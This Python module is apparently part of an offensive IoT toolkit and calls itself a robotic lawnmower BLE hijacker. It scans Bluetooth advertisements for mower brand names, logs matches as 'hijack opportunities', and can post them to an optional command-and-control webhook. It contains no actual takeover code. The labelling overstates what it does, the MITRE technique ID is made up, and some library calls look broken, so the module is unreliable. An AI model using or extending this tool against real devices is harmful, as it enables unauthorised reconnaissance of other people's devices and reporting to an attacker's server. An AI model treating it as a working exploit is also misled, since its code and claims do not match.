# modules/exploits/robot_lawnmower_override.py

import asyncio
import argparse
import aioblescan as aiobs
import time
import json
import os
from datetime import datetime

LOG_PATH = "results/exploit_logs.json"
MITRE_TTP = "T8212"  # Custom entry: IoT Mobility Override

TARGET_NAMES = ["Worx", "Gardena", "Landroid", "Mower"]

def log_hijack(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def decode_ble(data):
    # Placeholder for BLE ADV decoding logic (name matching)
    name = data.retrieve("Complete Local Name")
    return name

async def hijack_loop(interface, duration, c2_url=None):
    event_loop = asyncio.get_event_loop()
    socket = aiobs.create_bt_socket(interface)
    connection = aiobs.BLEScanRequester(socket, loop=event_loop)
    await connection.send_scan_request()

    print(f"[+] Scanning for lawnmowers on {interface} for {duration}s...")
    t_end = time.time() + duration

    while time.time() < t_end:
        res = await connection.recv()
        name = decode_ble(res)
        if name and any(tn.lower() in name.lower() for tn in TARGET_NAMES):
            print(f"[âœ“] Hijack opportunity: {name}")
            log_hijack({
                "timestamp": datetime.utcnow().isoformat(),
                "device": name,
                "iface": interface,
                "event": "ble_mower_detected",
                "ttp": MITRE_TTP
            })
            if c2_url:
                import requests
                requests.post(c2_url, json={"event": "mower_found", "name": name})
            break

    await connection.stop_scan_request()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Robotic Lawnmower BLE Hijacker")
    parser.add_argument("--iface", default="hci0", help="BLE interface (default: hci0)")
    parser.add_argument("--duration", type=int, default=30, help="Scan duration in seconds")
    parser.add_argument("--c2", help="Optional C2 webhook")
    args = parser.parse_args()

    asyncio.run(hijack_loop(args.iface, args.duration, args.c2))
